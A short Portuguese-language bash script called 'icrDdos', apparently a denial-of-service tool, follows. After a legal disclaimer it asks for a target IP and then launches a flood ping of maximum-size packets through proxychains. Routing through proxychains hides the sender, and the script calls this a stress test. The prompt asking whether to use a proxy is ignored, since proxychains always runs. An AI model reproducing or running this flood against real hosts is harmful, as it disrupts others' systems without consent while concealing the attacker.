#!/bin/bash


clear
echo "Aviso legal: O uso do icrDdos para atacar alvos sem consentimento prévio é ilegal. É responsabilidade do usuário final obedecer a todas as leis locais, estaduais e federais aplicáveis. Os desenvolvedores não assumem qualquer responsabilidade por uso indevido ou danos causados ​​por este programa." 
echo " " 


read -p "coloque a frente o ip que deseja fazer o teste de estresse: " ALVO 


read -p "Deseja usar proxy? s/n: " S 

sudo proxychains4 ping -f -s 65500 $ALVO
